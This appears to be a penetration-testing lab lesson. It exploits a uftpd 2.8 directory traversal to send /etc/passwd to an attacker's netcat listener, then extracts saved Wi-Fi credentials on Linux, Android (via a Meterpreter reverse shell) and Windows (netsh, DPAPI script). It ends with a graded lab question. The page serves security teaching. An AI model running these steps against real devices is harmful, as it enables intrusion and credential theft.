
<h1>Client Hijacking through Vulnerable Service</h1>
<hr/>
<p>We can hijack client devices by identifying and exploiting vulnerabilities in the services they are running. If a client has a vulnerable service that allows code execution or directory traversal, we can leverage it to gain access to the device and extract stored credentials.</p>
<p><img alt="Con" src="https://academy.hackthebox.com/storage/modules/299/macspoof/connect_general.PNG"/></p>
<hr/>
<h2>Reconnaissance</h2>
<p>Once connected to the Wi-Fi network, we can use nmap to scan the network and identify all active clients.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo nmap -v -n -sn  192.168.0.1/24  | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}'

192.168.0.1
192.168.0.60
192.168.0.61
192.168.0.59
</code></pre>
<p>Next, we need to scan for open ports on the connected clients. This can help identify running services and potential attack vectors.</p>
<pre><code class="language-shell-session">[!bash!]$ nmap 192.168.0.60,61,59

Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 11:42 UTC

Nmap scan report for Attica (192.168.0.59)
Host is up (0.0000050s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
MAC Address: 02:00:00:00:04:00 (Unknown)

Nmap scan report for Client2 (192.168.0.60)
Host is up (0.000032s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
2121/tcp open  ccproxy-ftp
MAC Address: 02:00:00:00:03:00 (Unknown)

Nmap scan report for Client1 (192.168.0.61)
Host is up (0.000032s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:00:00:00:02:00 (Unknown)
</code></pre>
<p>From the scan results above, we can see that one of the client devices has port <code>2121</code> open. We can use nmap again to perform a more detailed scan and determine the service version running on this port.</p>
<pre><code class="language-shell-session">[!bash!]$ nmap -T4 -sC -sV 192.168.0.60 -Pn -p2121

Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 11:47 UTC
Nmap scan report for Client2 (192.168.0.60)
Host is up (0.00042s latency).

PORT     STATE SERVICE VERSION
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines, NULL, SMBProgNeg: 
|     220 uftpd (2.8) ready.
|   Help: 
|     220 uftpd (2.8) ready.
|     214-The following commands are recognized.
|     ABOR DELE USER PASS SYST TYPE PORT EPRT RETR MKD RMD REST MDTM PASV
|     EPSV QUIT LIST NLST MLST MLSD CLNT OPTS PWD STOR CWD CDUP SIZE NOOP
|     HELP FEAT
|     Help OK.
|   SSLSessionReq: 
|     220 uftpd (2.8) ready.
|     command '
|_    recognized by server.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</code></pre>
<ul>
<li>
<code>-sC</code> → Performs a script scan</li>
<li>
<code>-sV</code> → Performs a version scan</li>
<li>
<code>-Pn</code> → Disables host discovery (treats all hosts as online)</li>
<li>
<code>-T4</code> → Increases scan speed</li>
<li>
<code>-p2121</code> → Scans for the port 2121</li>
</ul>
<p>The Nmap scan reveals that the service running on port 2121 is uftpd 2.8, and anonymous login is enabled. A quick Google search indicates that this version is vulnerable to a <a href="https://www.exploit-db.com/exploits/51000">directory traversal attack</a>, which could allow us to read any file on the client device.</p>
<hr/>
<h2>Performing the Attack</h2>
<p>To exploit this vulnerability, we can connect to the client on port 2121 using nc:</p>
<pre><code class="language-shell-session">[!bash!]$ nc 192.168.0.60 2121

220 uftpd (2.8) ready.
</code></pre>
<p>Next, we enter the following command, where <code>192.168.0.56</code> is our attacker's IP. The IP is formatted with commas (,) instead of dots (.), and 1,1002 represents the port number (calculated as 1*256 + 1002 = 1258):</p>
<pre><code class="language-shell-session">PORT 192,168,0,56,1,1002

200 PORT command successful.
</code></pre>
<p>We start a netcat listener on port <code>1258</code> using the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -nvlp 1258

Listening on 0.0.0.0 1258
</code></pre>
<p>Finally, in the uftpd session, we enter the following command to read the /etc/passwd file:</p>
<pre><code class="language-shell-session">RETR ../../../etc/passwd

150 Data connection opened; transfer starting.
226 Transfer complete.
</code></pre>
<p>Looking back at our netcat listener, we should see the output of the /etc/passwd file from the client device.</p>
<pre><code class="language-shell-session">Connection received on 192.168.0.60 58390
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
tcpdump:x:106:113::/nonexistent:/usr/sbin/nologin
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
srvadm:x:1001:1001::/home/srvadm:/bin/sh
</code></pre>
<hr/>
<h2>Retrieving Wi-Fi Credentials of all Connected Networks</h2>
<p>When we compromise a client device, we can attempt to extract and retrieve the saved Wi-Fi credentials stored on the system. This could provide access to additional networks, including enterprise Wi-Fi environments.</p>
<hr/>
<h3>Retrieving Wi-Fi Credentials from Linux</h3>
<p>To retrieve all saved Wi-Fi credentials for connected networks, we can check the <code>/etc/NetworkManager/system-connections/</code> directory. This folder contains configuration files named after each SSID in the format <code>SSID.nmconnection</code>.</p>
<p>For example, examining a file named <code>HTB-Corp.nmconnection</code> reveals the stored network details:</p>
<pre><code class="language-shell-session">[!bash!]$ cat /etc/NetworkManager/system-connections/HTB-Corp.nmconnection 

[connection]
id=HTB-Corp
uuid=g3bb5011-1234-1gbd-a291-b6a154eafb26
type=wifi
interface-name=wlan0

[wifi]
mode=infrastructure
ssid=HTB-Corp

[wifi-security]
auth-alg=open
key-mgmt=wpa-eap

[802-1x]
eap=peap;
identity=HTB\Sentinal
password=&lt;SNIP&gt;
phase2-auth=mschapv2
</code></pre>
<p>Here, we can see the network’s authentication method, identity, and password (stored in plaintext).</p>
<hr/>
<h3>Retrieving Wi-Fi Credentials from Android</h3>
<p>If we gain a session on an Android device, we may be able to retrieve the saved Wi-Fi password. However, this depends on several factors, including the device manufacturer, Android version, and whether the device is <a href="https://en.wikipedia.org/wiki/Rooting_(Android)">rooted</a>.</p>
<p>Once we establish a Meterpreter session, we can attempt to access the stored Wi-Fi credentials. Once inside the shell, we can read the <code>wpa_supplicant.conf</code> file inside <code>/data/misc/wifi/</code>, which stores Wi-Fi credentials on many Android devices:</p>
<pre><code class="language-shell-session">[!bash!]$ run

[*] Started reverse TCP handler on 192.168.0.1:4041 
[*] Sending stage (78189 bytes) to 192.168.0.18
[*] Meterpreter session 1 opened (192.168.0.1:4041 -&gt; 192.168.0.18:40258) at xxxx-xx-xx xx:xx:xx -0400

meterpreter &gt; shell
Process 1 created.
Channel 1 created.

cat /data/misc/wifi/wpa_supplicant.conf

ssid="HTB-Corporate-Wireless"
key_mgmt=WPA-EAP
eap=PEAP
identity="user-5645465"
password="a8wd4a798w4d84aw98d49a8w4d98aw4d984aw89d4awd"
phase1="peapver=0"
phase2="auth=MSCHAPV2"
</code></pre>
<p>Some Android devices, such as Samsung Galaxy phones, encrypt the <a href="https://android.stackexchange.com/questions/95923/decrypting-wpa-supplicant-conf-on-samsung-galaxy-mobiles">wpa_supplicant.conf</a> file, making it more difficult to retrieve stored Wi-Fi credentials. However, many other manufacturers store this file in plain text, allowing for easier extraction.</p>
<p>Different Android versions and manufacturers store Wi-Fi credentials in various locations, including:</p>
<p>Plaintext Storage (Older Devices &amp; Some Vendors):</p>
<ul>
<li>
<code>/data/misc/wifi/wpa_supplicant.conf</code>
</li>
<li>
<code>/data/wifi/bcm_supp.conf</code>
</li>
</ul>
<p>XML-Based Storage (Newer Devices):</p>
<ul>
<li>
<code>/data/misc/wifi/WifiConfigStore.xml</code>
</li>
<li>
<code>/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml</code>
</li>
</ul>
<p>When targeting an Android device for Wi-Fi credential extraction, identifying the specific storage method used by the manufacturer is crucial</p>
<hr/>
<h3>Retrieving the WPA Personal Credentials from Windows</h3>
<p>Whenever we connect to a Wi-Fi network and enter the password, Windows automatically creates a WLAN profile for that network. These profiles are stored on the system along with other configuration details. We can retrieve saved WLAN profiles, including their passwords, using the Windows Command Prompt.</p>
<p>Even if we are currently offline or connected to a different network, we can still uncover previously connected Wi-Fi networks and their passwords. To do this, follow these steps:</p>
<p>Open Command Prompt as Administrator</p>
<ul>
<li>Press <code>Win + R</code>, type <code>cmd</code>, and press <code>Ctrl + Shift + Enter</code> to run it as an administrator.</li>
</ul>
<p>Run the following command to display all stored Wi-Fi profiles on the system:</p>
<pre><code class="language-cmd-session">C:\htb&gt; netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    &lt;None&gt;

User profiles
-------------
    All User Profile     : HTB-Internal

</code></pre>
<p>This will list all Wi-Fi networks that were previously connected to the computer.</p>
<p>To reveal the saved password for a specific Wi-Fi network (e.g., HTB-Internal), use:</p>
<pre><code class="language-cmd-session">C:\htb&gt; netsh wlan show profile HTB-Internal key=clear

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : HTB-Internal
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "HTB-Internal"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : P@ssw0rd123

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
</code></pre>
<p>Look for the Key Content field under the Security settings section, which will display the saved Wi-Fi password. This method works even when the target network is not currently in use, making it an effective way to recover stored Wi-Fi credentials.</p>
<hr/>
<h3>Retrieving the WPA Enterprise Credentials from Windows</h3>
<p>WPA2-Enterprise credentials are encrypted using SYSTEM DPAPI (Data Protection API) keys, meaning only the SYSTEM user can decrypt them. To retrieve these credentials, we need local administrator privileges. This blog post provides a detailed breakdown of the credential recovery process, along with a proof-of-concept (PoC) script to extract plaintext WPA2-Enterprise credentials from a compromised Windows machine : <a href="https://0x00-0x00.github.io/research/2018/11/06/Recovering-Plaintext-Domain-Credentials-From-WPA2-Enterprise-on-a-compromised-host.html">Recovering Plaintext Domain Credentials from WPA2-Enterprise</a></p>
<p>When a user logs in to a WPA2-Enterprise network, the encryption process follows these steps:</p>
<ol>
<li>
<code>Authentication</code>: The AP confirms the login credentials provided by the user.</li>
<li>
<code>First Encryption</code> (User-Level DPAPI Key): The user's domain password is encrypted using DPAPI with the current user's encryption key.</li>
<li>
<code>Second Encryption</code> (SYSTEM-Level DPAPI Key): The username and domain name are encrypted using DPAPI with the SYSTEM encryption key. The previously encrypted password from Step 2 is also included in this encryption.</li>
<li>
<code>Storage</code>: The encrypted credentials are stored in the HKCU (HKEY_CURRENT_USER) registry hive.</li>
</ol>
<p>To extract and decrypt WPA2-Enterprise credentials:</p>
<ol>
<li>
<code>Extract Encrypted Data</code>: Retrieve the encrypted credentials from the HKCU registry hive.</li>
<li>
<code>SYSTEM Decryption</code>: Escalate privileges to SYSTEM and decrypt the first layer, revealing the Domain Name and Username.</li>
<li>
<code>Revert to User Context</code>: Use RevertToSelf() to switch back to the original user context.</li>
<li>
<code>Final Decryption</code>: Decrypt the password using the current user's DPAPI key to obtain it in plaintext.</li>
</ol>
<p>The function required to decrypt this data at the user level is the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.protecteddata.unprotect?view=netframework-4.7.2">ProtectedData.Unprotect()</a> method from the .NET API:</p>
<p>We can use the PoC PowerShell script provided in that <a href="https://0x00-0x00.github.io/research/2018/11/06/Recovering-Plaintext-Domain-Credentials-From-WPA2-Enterprise-on-a-compromised-host.html">blog</a> to recover the plaintext credentials.</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; .\Get-WPAEnterprisePasword.ps1
</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-WlanEnterprisePassword

Username: user-456545
Password: SuperS3cure1234$
</code></pre>
<p>We can also utilize tools available at the following link to achieve the same result:</p>
<ul>
<li>
<a href="https://github.com/ash47/EnterpriseWifiPasswordRecover">EnterpriseWifiPasswordRecover</a>
</li>
<li>
<a href="https://github.com/login-securite/DonPAPI/">DonPAPI</a>
</li>
</ul>
<p>We can use the obtained credentials to bypass the Wi-Fi captive portal if the user associated with the credentials is already signed in. Additionally, if we retrieve credentials for an enterprise Wi-Fi network, we can use them to authenticate and gain access to the network.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2978 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2978"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Retrieve the stored credentials for the Wi-Fi network named "HTB-Internal-Wifi". What is the password for the user Admin?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2978" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2978">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2978" id="btnAnswer2978">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
